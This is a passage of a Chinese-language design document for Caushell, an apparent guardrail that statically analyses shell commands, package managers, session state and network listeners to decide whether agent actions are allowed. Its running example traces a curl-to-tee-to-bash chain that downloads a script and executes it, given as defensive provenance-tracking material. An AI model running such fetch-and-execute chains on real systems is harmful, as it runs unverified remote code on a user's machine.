GPG key setup、预装插件代码和真实文件系统别名不在此静态 CLI 范围；`--installroot`
不是它们的沙箱证明。此声明核查的是传统 Yum，不声称验证各发行版由 DNF 提供的 yum 兼容入口。

### Homebrew：查询、包事务与不透明控制入口分开

`brew` Profile 使用独立 `manager: brew`，依据
[固定 Homebrew 源码](https://github.com/Homebrew/brew/tree/570982948a8a194f0f42f43f4a5bce2d1c9f64cb)
及[官方手册](https://docs.brew.sh/Manpage)建模。普通 list/info/search/outdated、安装信息、
shellenv 和 services list/info 与事务分开；明确的本地定义／URL 查询操作数、显式
`--eval-all`、未知选项和未覆盖形式保留不透明语义。shellenv 只打印代码，不等于执行代码。
查询保留隐含配置读取和缓存/API 元数据写入，不承诺整个程序完全无副作用。
已知没有缓存覆盖时沿用 incidental-cache 策略；显式 `HOMEBREW_CACHE` 正常检查路径，
环境状态未知时不伪装成“未设置”，沿用已有未知修改范围审批。

安装、重新安装、升级保留未知修改范围、包来源与导入逻辑执行；卸载、autoremove、
cleanup 保留未知删除范围；link/unlink 保留修改范围。它们不虚构 `/` 删除、
默认 `/opt/homebrew` 写入或不存在的包来源节点。包名和 qualified tap 引用是 registry 来源；
URL、动态值、明确本地路径及不支持的 URL 语法独立判断，不按 `.rb` 等后缀猜文件。
既有来源护栏与工作区修改护栏分别生效。

原生 launcher 根据入口及文件系统推导 prefix 并覆盖 `HOMEBREW_PREFIX`；请求中的同名变量
不能证明真实安装目标。Cask 也可能操作前缀之外的应用、服务和系统位置。
16 类显式 Cask 目录分别绑定，并采用同一选项最后一个值；未知、空和越界值保留原有判断。
这些目录是额外目标，不替代整个事务的未知范围，也不构成安装脚本的沙箱。
根命令 `brew --prefix` 是查询，不是 `brew install` 的目标覆盖选项。

services start/stop/restart/run/kill/cleanup、Brewfile、Ruby、外部子命令、tap setup 和未知入口
通过 `opaque_on_unresolved` 走既有审批，不虚构 PID 或把内容解释成 Bash 子调用。
安装类 dry-run 的 bootstrap、auto-update 和定义加载边界仍不透明；文档明确的
cleanup/autoremove/link/unlink 预览不声明事务修改／删除。裸 `--json` 不吞包名，
`--json=value` 用既有表单前缀绑定保留值；选项边界之后的内容仍是数据。
既有参数绑定器、分派器和风险 Pass 不变；只新增 Profile 和包管理器身份。
没有动态探测、Harness 字段、新依赖或宿主机包／服务操作。此静态范围不解释隐含配置正文、
Ruby 定义／安装脚本、运行时依赖闭包、任意自定义安装布局或完整 Homebrew 控制语言。

### 按参数角色识别包来源，不猜文件后缀

包来源使用绑定参数的 `package_locator.locator_kinds` 声明和静态确定的 argv 值，不再根据 `.txt`、`.in`、`.lock` 或文件名里的 `requirements` 推断定义文件。

共享分类器先取得语义 argv 值，区分尚未解析的 shell 展开与字面数据，再将明确的本地路径、HTTP(S) 和 VCS URL 语法与 Profile 声明匹配。定义文件参数只声明一种本地角色时，无后缀、相对路径和绝对路径均保留 `requirement_file`；普通包参数可以保留 `registry_ref`。已有的各管理器含斜杠包引用优先级不变。本地角色冲突、不支持的 URI 和未知参数保留为 `unknown_dynamic`，不会丢失来源记录，也不会兜底伪装成注册表包；即便 Profile 只声明具体输入类型，也不能取消分析中的未知状态。

例如，`pip install requests.txt` 的操作数是注册表引用，`pip install -r requests.txt` 是定义文件，`pip install -e requests.txt` 是本地来源。`pip install -r input` 和 `conda env create -p env -f environment.yml` 同样不依赖后缀识别定义文件，不读取内容或探测文件是否存在。pip `-r` 声明允许本地定义文件或直接 URL，与[官方选项语义](https://pip.pypa.io/en/stable/cli/pip_install/#cmdoption-r)一致。

已知本地输入保留文件内容来源关系，已知 URL 保留网络来源关系。经引号保护或已物化参数中的字面 `$` 不会再次展开。简单 shell `~/` 可使用请求提供的 home，不查询其他用户或探测宿主机状态。分类本身不授予执行许可，动作仍由既有护栏与策略配置决定；该约定不声称完整覆盖所有包管理器来源语法，也不解释定义文件内容。

现有包执行护栏检查当前调用消费的全部来源，不只检查第一个包。前置条件使用已有 `executes_imported_package_logic` 事实；没有该事实就跳过来源边遍历。仅检查指向包来源节点、标有 `ImportedPackageLogic` 的 `Consumes` 边。每个不同的“执行调用／来源节点”组合分别保留证据并应用既有来源策略，最终仍由已有决策汇总维持 `Deny > NeedApproval > Allow`。重复参数或多个 slot 消费同一来源不重复报告，不同调用和不同来源类型则不合并。纯下载、预演和查询不会仅因 Graph 里存在包来源节点就变成包执行。没有新增 pass、Profile 命令名特例或全会话图扫描。

## 会话图扩展

每个会话维护一张持续更新的执行图。分析当前 action 时，Caushell 先把新产生的命令、状态和来源关系叠加到已有图上，形成本次分析使用的视图。

这个分析视图由两部分组成：

- 已经提交到会话执行图的会话事实；
- 当前 action 新产生、尚待提交的节点和边。

上图展示的是加入当前 action 后，与示例相关的部分。图中的实体分别表达：

| 图中实体 | 表达的事实 |
| --- | --- |
| Command Invocation | 当前 action 或会话历史中的命令调用 |
| Variable Binding | 变量在当前 action 或此前 action 中绑定的值 |
| Runtime State | 当前目录等运行状态 |
| Resolved Path | 结合变量和当前目录解析出的具体路径 |
| Network Endpoint | 命令访问的网络来源或目标 |
| Payload Artifact | 从网络、文件或其他输入获得的数据 |
| Path Content | 某个路径对应的文件内容 |
| Execution Sink | 脚本、解释器或其他执行目标 |

### 运行时变量赋值

既有 `bind_variable_from_runtime_input` effect 声明运行时写入的变量名。命令解析与静态脚本输入分析共享按源码顺序的变量回放：旧精确标量失效，后续明确赋值可以恢复精度；变量名不能完整物化为合法标量标识符时，由现有未解析操作策略审批。注册表加载时派生候选索引，不含该 effect 的普通命令不进行额外 effect 解析；不新增风险 Pass、动态进程探测或 Harness 输入字段。

`wait`、`wait -n`、`wait -f` 是等待，不是进程控制；`wait -p target` 声明运行时赋值。静态层不预测 PID，也不假定调用成功：`target` 记录为未知、可能未设置，不能继续使用旧路径。当前 action 明确遇到的 nameref／数组目标不按标量猜测，保留审批；标量快照不是完整 Bash 类型或作业状态探测。

当前 shell 的 effect 更新后续命令和获准 action 的会话状态；函数全局写入可传递，明确的局部变量和子 shell 写入不污染调用者。拒绝／待审批 action 不提交预测状态；新的完整真实快照优先于预测未知。依赖失效变量的 stdin 不伪造精确脚本，也不因存在本地输入而丢掉既有未解析输入证据。Graph 仍保留变量绑定 intent；它不是已执行的证明。

### Shell 退出与状态传播边界

`exit` Profile 声明 `terminate_current_shell`，不伪装成进程控制；普通退出默认允许，不因此新增审批规则。Graph 及公开执行语义 Query 暴露 `terminates_current_shell`，旧记录缺失时按 false 读取。事实附着于既有 execution unit：函数属于调用者 Shell；子 Shell、管道分支、后台 frame 及另外启动的 Shell 则按隔离作用域处理。

注册表候选索引驱动按源码顺序的 Effect 回放。可静态解析、非条件退出形成状态传播边界；同一 frame 后续的赋值、unset、位置参数更新和别名／函数定义不再当作生效状态。函数退出传递至调用者 frame，隔离退出不传递。命令仍保留在审计 Graph 中，风险检查继续保守执行，不进行不可达代码裁剪。根 frame 已退出时不宣称有可信的返回 cwd；条件退出不假定所有分支都会结束，未支持参数形态继续由既有未解析语义策略审批。

重定向准备可能在 builtin／函数启动之前失败，因此这种调用不证明确定的退出状态边界，仍分析继续执行路径；带路径的外部可执行文件也不能证明当前 Shell builtin 语义，保留未解析操作审批。这是静态建模的 Bash 行为，不是实际退出观察或会话生命周期重置；Harness 的新快照仍优先。EXIT trap 和一般的当前 Shell payload／控制流执行是独立能力：本轮不恢复 trap 状态，也不宣称覆盖全部 eval／source／return／errexit 路径。没有新风险 Pass、动态探测、依赖或 Harness 请求字段。

函数中的未知调用或不透明 payload 可能在后续退出指令之前返回；有界回放不会跨越这种控制流缺口证明调用者一定退出，缺口后的嵌套函数调用也一样。这是通用证明边界，不是 `return` 命令名特例，也不是新风险规则。

### Shell 作业管理

Profile 可声明 `{kind: shell_job_operation, shell_job_operation: remove_from_job_table|suppress_sighup, target: {kind: none}}`。既有语义提取 Pass 将类别去重后记录在 `ExecutionSemantics.shell_job_operations` 和公开执行语义 Query 中，并标记修改所属 Shell；旧记录缺字段默认为空，空列表不输出。这是作业管理意图，不是向进程发信号、已完成脱离、确认作业存在或保证存活的事实。

`disown` 默认从所属 Shell 作业表移除目标，`-h` 则保留作业表项、取消 Shell 的 SIGHUP 转发。`-a/-r`、作业标识及 PID 保留在原始调用中；目标作为普通值绑定，不伪装成文件路径或动态查询真实作业表。普通模式及未知作业目标默认 Allow，不因目标不明套用进程控制审批。未知选项仍通过既有未解析操作策略处理，`--help` 不记录作业修改；`--` 后和首个作业参数后的 `-h` 是数据，不改变操作类别。

函数、别名及派生 Shell 中的语义仍附着于其 execution unit；不把子 Shell 的作业表变化传播成调用者状态。带路径的外部 executable 不证明所属 Shell 的 builtin 语义，保留未解析操作审批。Caushell 不维护预测作业表，也不从 Graph 删除此前启动的进程。后台程序启动本身、kill、外部重定向等独立效果仍受原有护栏约束。没有新风险 Pass、动态探测、依赖或 Harness 请求字段。

### export／unset 的标量选项状态

选项解释在共享 Shell 状态层完成，不新增 Profile 或风险 Pass。`export -n NAME` 取消导出属性但保留当前 Shell 的标量；带赋值时仍更新标量。`export -p` 无名称时仅查询，有名称／赋值时仍按 Bash 的导出操作处理。`unset -v NAME` 只删除变量，`unset -f NAME` 只删除函数，不混淆同名对象；组合 `-fn` 按函数删除，`-vf` 是无状态修改的非法组合。

解析器只把首个操作数／`--` 之前的词当选项，保留组合短选项和静态引用；例如 `export NAME -n` 不取消导出，`unset NAME -f` 不切换到函数模式。变量赋值、导出及删除共用源码顺序回放，session 持久化提交最终状态，不再按操作类别分组；已导出的变量被普通赋值后仍保持导出。显式隔离 frame 的修改不污染调用者，普通函数中的全局标量变化可传递，已有退出状态边界继续生效。

同一条声明内建命令的赋值参数先统一展开，再更新绑定：`A=old; export A=new B="$A"` 中 B 为 old；纯赋值 `A=new B="$A"` 则按赋值顺序使用 new。持久化层直接复用已计算的最终回放结果，不重复解释选项或再做一次完整回放；独立使用变量提取 Pass 时仍调用相同的静态回放入口。

普通 `unset NAME` 先处理变量，只有能确认变量不存在时才删除同名函数；变量存在则保留函数，变量存在性未知则把已知函数绑定标为不确定。存在性不是导出环境中是否有值：未导出的变量仍阻止函数回退，`export NAME` 可以建立无标量值的声明，而 `export -n NAME` 单独使用不会建立声明。操作数按顺序处理，例如 `unset NAME NAME` 可以先删除变量、再删除函数。Bash 函数名也不被强制当作变量标识符。

变量和函数共用一次源码顺序状态回放。条件删除／定义、未知删除目标或选项不保留旧函数体为精确状态；单独遇到这些状态修改不触发审批，后续真正调用受影响函数时，由已有 ResolvePolicy 的 `opaque_invocation` 缺口默认要求审批。无条件定义、无条件 `unset -f` 或权威函数快照可恢复确定状态。同 Shell 的函数、eval、命令／进程替换继承分析状态，隔离作用域不污染调用者；外部可执行程序分派不使用调用者的函数查找。退出状态边界保持有效。

不确定绑定通过既有 Upsert mutation 保存可选的 `uncertainty` 原因，不假造函数定义 Graph 节点，原始内容节点保持不可变；旧记录缺少该字段时仍作为精确绑定读取。函数提取 Pass 复用解析阶段计算的有序结果，独立使用时也走同一个静态状态回放，不另建条件分支模拟器。

本轮不声称还原命令成功、readonly 或完整 Shell 类型属性；`export -f` 的子 Bash 函数继承、nameref 目标和完整条件分支合并仍暂缓。未建模的声明／运行时赋值不被当成变量不存在的证明。动态选项／目标及未建模的 `unset -n` 不保留旧标量为精确值；不新增 Profile、风险 Pass 或动态探测，无需 Harness 额外采集／提供状态事实，CheckRequest 的 Shell 快照字段不变。

函数绑定的 Graph 身份复用 alias 的“名称＋action 序号＋稳定内容指纹”机制。同一 action 中不同函数体分别保留不可变节点，相同内容重复定义保持幂等；有序 mutation 和当前绑定与内容节点身份分开处理。原有节点冲突校验保持不变。旧存储中的 ID 继续读取，不重写历史，不修改快照结构，不需要迁移，也不新增风险规则或 Harness 字段。

共享暂存层用“mutation 内容＋源码位置”识别带位置的 Shell 状态操作。同一次操作被重复提取仍幂等，不同位置的操作按暂存顺序保留，包括定义、删除、同内容再定义。Alias 赋值使用操作数 token 的位置，避免同一条 `alias` 命令中最后设回旧值的操作丢失；无位置的审计事实／最终状态事实继续按内容去重。退出边界逐次过滤状态操作，不删除审计事实，过滤后重建暂存索引。替换解析工件时只清除旧坐标，不删除已有暂存项。发生位置仅在当前请求内使用，不改变已存储的 mutation、Graph 身份或 Harness 字段。

### 变量绑定与路径解析

`SCRIPT=./setup.sh` 建立变量绑定后，`tee "$SCRIPT"` 和 `bash "$SCRIPT"` 得到同一个相对路径。图中的 Runtime State 表明当前目录为 `/workspace`，因此该路径被解析为 `/workspace/setup.sh`。

`tee` 的文件写入和 `bash` 的脚本读取都指向同一个 Resolved Path，因此图会把 `tee` 写入的内容和 `bash` 读取的内容关联到同一个文件。

无法确定的变量或路径会在图中保留为未知状态，后续分析会同时考虑已知关系和这些未解析的信息。

### 来源关系

来源关系（provenance）记录数据从哪里来、经过哪些步骤、最终被如何使用。图示 action 形成下面的关系：

1. `curl` 从网络地址取得内容。
2. 管道把 `curl` 的输出交给 `tee`。
3. `tee` 将内容写入 `/workspace/setup.sh`。
4. `bash` 读取该路径，并将其中的内容送入 shell 执行。

这条关系链连接了网络来源、下载内容、文件内容和脚本执行。分析模块可以沿图反向追溯，得到可复查的证据链。

### 嵌套分派与运行时参数

`option_scope: permuted_options` 复用声明驱动的选项归属扫描，但遇到普通操作数后继续，
直到真正的终止符。保留原 argv 顺序、span 与来源，不实际重排参数。
例如 `pv input -F --help -o out` 的 `--help` 是格式值，不是帮助开关；
必需参数可以消费字面 `--`，之后未被消费的终止符才结束扫描。
附着值即使重复选项字母也仍是值。根与子命令各自保存实际归属，未知参数个数停止形式确认，
保留此前已确认的效果，但不把后续词形像选项的值臆断成控制项。
既有 `all_arguments` 默认与 `leading_options` 的停止边界不变。

分派 target 可声明 `stdout_to_parent: true`。既有流来源 Pass 通过 `dispatch_stdout`
artifact 记录子命令 `Produces` 与父命令 `Consumes`，实际字节仍是未知，
子命令已建模的输入来源得以进入父管道、重定向和显式声明的 wrapper 链。
它与 `stdin_from_parent` 独立，分派／控制边本身不代表数据流；每次直接分派用自己的声明，
不继承外层 wrapper 的开关，省略默认 false。Canonical Bash command-string scope
提供真实管道节点映射，避免只连到旧的重复节点。不增加风险 Pass、动态探测或 Harness 字段，
也不推断任意解释器内部行为或宣称完整重放 FD 路由。

pv 保留普通文件／stdin 传输、显式输出与暂存、PID 文件替换／删除、数字 FD 进度查询，
以及 monitor 的真实子 argv。`-o -` 是 stdout；`-U -` 是生成临时存储，保留未知写入／删除。
cursor 锁存储同样未知。远程重配置、会写 IPC 文件并发信号的 query、名称／文件 watch
及未支持形式走既有未知语义审批。重复显式目标保守保留，不提供隐含缓存豁免。
Env 同样显式声明 stdout 继承；其他 Profile 没有声明就不会自动获得此连接。
Curl 的既有 `@file` 内容读取缺口单独记录，本轮不改；pv 暂存来源测试用明确建模的文件读取隔离验证。

采用前置选项语法的 Profile，可以在命令根节点或单个子命令节点声明 `option_scope: leading_options`。共享绑定器先按声明解析选项及其操作数，遇到第一个非选项操作数或选项终止符 `--` 后停止；modifier 匹配、form 选择和参数绑定共同遵守这条边界。例如 `sshpass -e ssh -p 2222 host` 中的 `-p 2222` 属于 `ssh`，不会成为 `sshpass` 的密码参数。长得像选项的值仍然是值，子命令的完整 argv（包括自己的 `--`）保留给既有嵌套分派。位置参数仍覆盖整个调用，因此 `env` 能先消费环境赋值，`timeout` 能先消费时长，再确定子命令。

默认仍为 `all_arguments`，普通 Profile 依然可以描述操作数后面的选项。前置选项的操作数数量来自 modifier/form 的 flag binding 声明；未知选项会产生显式 selection gap，并保留已经确认的 modifier 效果，不猜测子命令边界。这不会改变配置中的解析缺口动作或嵌套展开上限。

Profile 可选声明 `selection_failure_effects`，在 form 选择失败时保留不依赖操作数的效果。效果沿用通用校验且必须使用 `target: {kind: none}`，不虚构未绑定参数；未声明的旧 Profile 行为不变。效果进入部分绑定，再由对应分析规则处理，不覆盖全局解析缺口动作。Redis 用这一声明保留不透明数据库操作。

`matcher: {kind: ascii_case_insensitive_literals, values: [GET, MGET]}` 按完整值进行 ASCII 大小写不敏感匹配，不编译正则：`gEt` 命中，`GETDEL` 不命中；正则元字符是普通文字，不作 Unicode case folding。空集合或空条目载入时报错，旧 literal／regex matcher 行为不变。

选项名如何匹配由另一个声明控制：`option_matching: exact_names` 按完整声明的名字匹配 NVIDIA 的 `-pl`、`-nic` 等选项，不把字母拆成短选项组合，也不猜测短选项附着值。`--power-limit=200` 这样的长选项内联值仍按参数绑定声明处理。不写此字段时默认 `short_clusters`，保持已有匹配行为。子命令节点继承父节点模式，也可以显式覆盖；继承在 Profile 载入时完成。modifier 匹配与约束、form 及 remaining selector、参数绑定、前置选项扫描、选择失败后的部分绑定均使用相应模式。这不会改变 Bash 语法解析，也不新增风险 pass 或直接决定审批动作。

例如，Profile 声明 `option_matching: exact_names`，再以 `flags: ["-pl", "--power-limit"]` 绑定后面的普通值 `power_watts`。`-pl 200` 只绑定该选项，不激活 `-p` 或 `-l`；`-pl200` 不会被猜成附着参数。这个模式不是通用 CLI 合法性或覆盖检查：既有 `all_arguments` 绑定器不会为每个未知 flag 生成 residual。已知未支持形式、解析缺口动作与成功建模的调用仍须区分。

命令 Profile 可声明 `option_prefixes: dash_and_plus`，让物化后的 CLI 参数识别两种选项前缀，并保留其区别：`+c` 与 `-c` 可以绑定不同的 modifier／操作数，`++` 与 `--` 均为选项终止符，短选项组合及附着参数也保留原来的符号。这个根节点语法适用于同一 Profile 的子命令，不会继承给另行分派的工具。结合 `leading_options`，选项归属仍在第一个非选项操作数处停止；声明过的选项值不会被重新解释成另一个选项或终止符。默认是 `dash_only`，因此 `date +%F`、`chmod +x` 等参数保持原有数据含义。该声明不改 Bash 词法、参数文本／跨度／来源、风险规则或 Harness 协议；默认投影路径直接返回，不扫描或克隆 argv。

新增 flag binding 模式 `operand_mode: optional_next_arg`：先取短选项附着值或长选项内联值，否则仅取紧邻的非选项参数。后续选项／终止符仍归自己的解析器，前缀判定使用当前 Profile 的语法。`optional_one`／`optional_many` 允许没有值；required cardinality 仍会报告缺失操作数。显式空字符串不是缺失，存在但被约束拒绝的值即使 cardinality 为 optional 也保持未解析，不被当作合法省略。旧 operand mode 不变。例如 `lsof -i`、`lsof -i :8080`、`lsof -i -n` 分别绑定无选择值、`:8080`、无选择值加独立 `-n`。

lsof Profile 将文件／目录、PID、FD 和 socket 选择器当作元数据查询值，不虚构选中文件的内容读取、进程控制或监听器创建。实际的 `+m file` 挂载补充文件读取单独保留；裸 `+m` 不制造文件输出。原生 `-D` 缓存操作和未支持方言形式通过 `opaque_on_unresolved` 走既有审批；会重新进入原生选项解析的数字操作数仅接纳已建模的完整数字／repeat 格式，不把任意尾缀吞成普通数据。外层重定向和派生子调用仍按自身效果检查。这一范围不逐项模拟所有版本／构建的选择器、解析器或隐式缓存实现。

前缀绑定可声明 `binding: {kind: args_with_prefix, prefix: '-D', before_dash_dash: true}`，仅绑定选项终止符之前尚未消费的匹配参数。声明过的选项操作数先绑定，因此作为选项值的字面 `--` 不被误当作分隔符，后面的实际 `--` 仍能终止绑定。该绑定不消费分隔符或后续数据。省略该字段或设为 `false` 时保留原有全范围行为。因此 `ss -Ddump -- state established` 保留 `dump` 写入，而 `ss -- -Ddump` 不从过滤数据中制造写入。这是命令无关、按声明启用的绑定能力，不是新增风险规则。

Command Profile 描述命令可能分派到哪里，以及参数如何绑定。分派层将参数作为带类型的值传递：字面 argv 数据、运行时产生的值，或带保守取值域的隐式输入。消费者可以用有界路径域分类可能的位置，但这些根目录不代表实际操作的具体文件。未知输入与已知空输入始终有区别。

共享 stdin 来源查询按 shell 顺序静态回放单条命令的重定向声明。FD 数字拼写会规范化（`000` 即 FD 0）；复制保留复制当时的来源，移动到不同 FD 会关闭旧 FD，复制／移动到同一 FD 则保留来源。这不是探测实际 FD，也不会将推测的 FD 表跨 action 持久化。只有最终生效来源进入显式 stdin／管道来源边；被覆盖的重定向及进程替换仍可保留各自独立的打开／生产效果。关闭 stdin 表示不能提供可执行字节，不意味着运行时读取会成功或返回 EOF。未知 FD 内容或未能投影的显式来源保留 `RuntimeInput` 节点，交由既有 tainted-execution 护栏判断。未知输入兜底在重定向和进程替换来源生产者之后运行，不再把“语法上出现重定向”等同于“来源已经建模”。

`find -exec`/`-execdir` 和 `xargs` profile 使用相同的分派与执行图机制。`find` 参数可以携带有界搜索根域；跟随符号链接、无法解析的根，以及无法确定上下文的 `-execdir` 会扩大该域或保留未知。只有来源已知完整时才使用 `xargs` 静态输入；部分已知片段仅作为参考，不能证明它们是 argv 的前缀，不完整或运行时生成的输入会使参数保持未知。显式 stdin 重定向优先于管道输入。

已知 argv 数据不会再被解析成 shell 源码。shell `-c` 参数会在 payload 边界作为代码解析一次，而其位置参数仍作为带类型的数据单独绑定。递归 inline 执行复用规范执行 frontier，在配置的深度范围内扩展图并保留来源关系。这能保守建模常见用法，但不是完整的 shell、`find` 或 `xargs` 解释器。

默认展开深度为 8，顶层命令计为第 0 层。达到第 8 层本身不代表风险：已经完整分析的叶子仍按正常规则判断。如果预算之外还有执行子调用，展开停止，由现有 resolve-policy pass 通过 `execution_expansion_limit` 提议 `NeedApproval`。决策 trace 保留截断证据、深度预算和待处理候选数量。规范执行 frontier 和嵌套 payload 的截断都进入这个兜底；已解析的祖先、以及不支持的静态字面量默认 Observe 策略，不会掩盖展开未完成的事实。已有 `Deny` 判断仍优先。

## 可选内联参数与位置参数筛选

`operand_mode: optional_inline_only` 接受裸选项或长选项 `--option=value`。
裸选项不消费后续的位置参数、其他选项或终止符；optional cardinality 允许无值，
required cardinality 仍要求实际值。显式空内联值不是缺失，被约束拒绝的值仍未解析。
短选项附着参数不属于该模式，旧 operand mode 行为不变。

`binding: {kind: positionals_matching, matcher: {kind: regex_pattern, pattern: '^[/.]'}}`
按既有 matcher 筛选整个归属范围内未消费的位置参数，不要求匹配值连续出现。
匹配使用解码后的字面语义值，绑定保留原参数、引号、node kind、span 和来源；
已确认的运行时 argv 数据不再次展开，未知动态值不按可见前缀猜测。
已被选项占用的操作数不会变成位置参数，未匹配项留给后续绑定。
正则每次绑定只编译一次，未选择该 Profile 时不运行这一绑定。
旧 `args_with_prefix` 继续提取前缀之后的负载，不改变原有语义。

## GNU Mailutils mail

`mail` Profile 固定 GNU Mailutils 3.21，不等同于 BSD mail/mailx 或 s-nail。
非终端正文和附件是数据；`-A` 是附件，GNU `-a` 是邮件头。
邮箱／本地别名按字面 `email_address`、`upload_target` 记录，不冒充 URL；
`/` 或 `.` 开头的文件收件人保留完整路径。
`|` 开头的执行收件人、Mail 语言 `-E`、头部派生／未知目的地及未支持控制形式，
沿用既有不透明语义审批，不把整个参数伪装成 Bash 源码。

GNU `-f` 是模式开关，邮箱取首个位置参数；裸 `--file` 与 `--file=mbox`
按各自的可选内联语义绑定。邮箱查询保留真实读写，因为原生打开／扫描会创建邮箱
或更新 UID 存储头。Mailutils 配置、系统 mailrc 和 MAILRC 分层；`-n` 只禁用
系统 mailrc。显式输出收件人、失败 DEAD 存储以及真正未知的 compose spill／byname
目标仍保留修改效果，所以普通发送不承诺免审批。
不增加动态配置解释、Mail 解释器或自动方言探测。

既有污点执行分析目前把所有网络端点视作输入，在加载启动配置的发送命令上，
会把上传目的地误认成配置执行来源。这是独立的精度问题，本轮没有改动。
Graph 专项显式隔离该问题和未知 spill 策略；默认策略诊断、敏感数据外传与不透明
执行的检查分别保留，测试配置不代表产品默认策略。

## 会话图生命周期

| 时点 | 图状态 |
| --- | --- |
| 检查开始前 | 会话执行图保存此前已经提交的会话事实 |
| 当前检查中 | 本次分析视图加入当前 action 新产生的节点和边 |
| 决策为 `Allow` | 当前 action 的图变更提交到会话执行图 |
| 决策为 `NeedApproval` 或 `Deny` | 保留本次请求记录，新增的节点和边不进入会话执行图 |

运行时 shell 状态还会标明 cwd、变量、别名和函数等信息是否可见，以及是否跨 action 保留。由 Harness 提供并经 runtime 确认的信息可以参与后续 action 的命令建模；无法确认的信息会记为未知。

## 网络监听与 Uvicorn

新增 `listen_network` 效果，与外发请求的 `network_endpoint` 分开。
Profile 使用 `network_listener` 声明 host、port、UNIX socket 和继承 FD 的来源：
同一 CLI slot 的最后一个参数优先，其次是声明的环境变量，最后是字面默认值。
高优先级值未知时不能退回已知默认值。通用 `configured_path` 同样支持
`environment: {name: ..., empty_is_unset: true}`，让 socket 创建及清理进入既有文件路径语义。

提取结果写入 `ExecutionSemantics.network_listeners`，可以从语义 Query、决策 trace
及会话快照读取。独立 `network_listener_guard` 使用 `network_listener_exposure`
规则（`network_safety` 家族，默认 `NeedApproval`）：

- 静态确定的 IPv4／IPv6 回环地址，包括 IPv4-mapped 回环地址，不因监听本身审批。
  局域网地址、本机非回环 IP、`0.0.0.0`／`::` 不属于这项“本地”豁免。
- 域名（包括 `localhost`）、动态地址、环境事实缺失，以及无法确认范围的继承 socket，要求审批。
  不做 DNS、进程／socket 探测，不读护栏宿主机环境，也不增加 Harness 字段。
- 已知文件系统 UNIX socket 交给既有文件修改护栏。本地监听不会豁免重定向或其他操作。

Pass 先检查本次请求已经提取的事实，没有非本地或未知监听候选就直接返回，不查询 Graph。
需要判断时使用当前 sequence 的索引窗口，不扫描全会话历史。历史监听事实不会单独触发后续 action 审批。

首个内置使用者是 `uvicorn`，同时通过 Profile 声明支持 `python[3] -m uvicorn` 分派。
保留应用代码加载、`--host`／`--port`、`--uds` 创建和清理、`--fd`、配置输入、证书读取及常用参数的绑定。
`--app-dir` 是搜索路径而非 cwd 变化；`--root-path` 是 HTTP 前缀而非文件路径。
服务器默认参数可来自 `UVICORN_*`；`--env-file` 是应用配置输入，不读取其内容推测监听设置。
同时提供 FD 和 UDS 时，绑定优先级取决于启动模式，因此保守审批，并保留 UDS 清理效果。

环境事实复用现有 shell-state 的可观测性和 exported 标记。Complete／ExportedOnly 快照可以证明环境变量缺失；
未知快照不能。子进程环境与 shell 局部变量分开保存，传递前缀赋值、export、unset 以及 Profile 声明的环境清空／移除。
`env` 的 dispatch target 声明 `clear_environment_when: [ignore_environment]` 和
`unset_environment: [unset_names]`，监听代码不按命令名特判。
条件／隔离作用域中的导出和未解析的导出选项保持未知；新 shell 不继承未导出的局部变量，已导出会话变量仍保留 Graph 来源关系。

本轮实现静态监听准入，不分析 Python 应用体、防火墙可达性或运行中进程存活状态。
其他服务命令仍需各自的 Profile 声明，不把现有通用 endpoint 自动视为监听。
依据：[Uvicorn CLI](https://github.com/Kludex/uvicorn/blob/724f82fdba1765fe5f821a3ebed6da5c1ddcb386/uvicorn/main.py)、
[服务启动](https://github.com/Kludex/uvicorn/blob/724f82fdba1765fe5f821a3ebed6da5c1ddcb386/uvicorn/server.py)、
[socket 绑定](https://github.com/Kludex/uvicorn/blob/724f82fdba1765fe5f821a3ebed6da5c1ddcb386/uvicorn/config.py)。

## 环境准备与 `uv`

`uv` Profile 同时保留包装器的准备效果和子调用。`uv run` 可能先创建或替换项目环境，
即使 `--no-sync` 也可能创建缺失的环境；`--locked`／`--frozen` 限制的是锁文件更新，
不是环境修改。`--with*` 叠加依赖和无法读取的 PEP 723 脚本元数据还可能准备其他环境。
这些真实环境修改进入既有文件修改护栏，不冒充可豁免的隐式缓存。

支持 `run` 的外部命令／模块／本地脚本／stdin／URL 入口，`sync`、`venv`、
直接 `pip install/sync/uninstall` 及查询、`lock`、`add/remove` 和帮助形式。
保留已知 CLI 目标和绝对 `UV_PROJECT_ENVIRONMENT`。
项目发现可能选中父目录，因此默认或相对项目环境、未发现的锁文件目标保留未知，
不能假定落在请求 cwd 内。预演形式不声明其事务修改，独立选项声明的效果仍保留。
包来源复用共享分类器，保留完整字符串；相对本地包节点身份加入解析后的来源路径，
避免不同 cwd 下的同名参数被合并。绝对路径、网络和注册表身份不依赖 cwd。

共享 DSL 增加三项声明能力，风险代码没有 `uv` 命令名特例：

- `set_execution_working_directory` 配合 `configured_path`，改变当前进程和执行子调用，
  不改变调用者 shell。`--directory`／`UV_WORKING_DIR` 使用它；`--project` 不改变子调用 cwd。
  shell 展开和外层重定向仍使用 shell 入口 cwd。路径、包来源、仓库修改范围和嵌套 shell
  重定向与修改决策使用一致的已知分支或未知 cwd 事实。
- `configured_path.unresolved_relative_base: true` 用于基准目录需文件系统发现的相对目标，
  不允许与 `relative_to` 同时声明。空 `sources` 只允许有环境／字面默认来源，或
  `missing: unknown`；空来源且只有 incidental-cache 豁免的声明仍无效。
- dispatch 在 `command`（slot）、`command_literal`（固定可执行名）、上文的
  `command_whitespace_argv`（编码 argv）和下文的 `command_string`（声明式工具语法）
  中必须选且只选一个；前两种可用 `argv_prefix`
  加入固定 argv 数据。例如
  `{kind: dispatch, command_literal: python, argv_prefix: ['-m'], argv: [module, args]}`
  形成带类型的解释器调用，不把字面参数重新当 shell 源码解析。
  `unknown_environment_when`（modifier ID）和 `unknown_environment_from`（声明的环境来源）
  表达不可读取的 env 文件可能替换子环境值，不能继续沿用旧的确定性；后续显式环境变换正常生效。

本范围不读取项目／配置／requirements／脚本内容，不发现已安装解释器。
自动 Python 获取、`uv tool/python` 管理、build/publish 和其他未支持的管理命令不计入覆盖；
解释器下载可能增加额外写入目的地。Profile 明列限制，不声称覆盖完整 uv CLI。
没有增加动态探测、Harness 字段、风险 pass 或审批策略。
依据：[uv CLI](https://docs.astral.sh/uv/reference/cli/)、
[run 实现](https://github.com/astral-sh/uv/blob/a75d26a6abb614d60cdf1947dfaa13d7b9bb2978/crates/uv/src/commands/project/run.rs)、
[项目环境准备](https://github.com/astral-sh/uv/blob/a75d26a6abb614d60cdf1947dfaa13d7b9bb2978/crates/uv/src/commands/project/mod.rs)。

## MySQL 不透明客户端协议

`mysql` Profile 固定官方 MySQL 8.4.6 客户端，不自动覆盖 MariaDB。
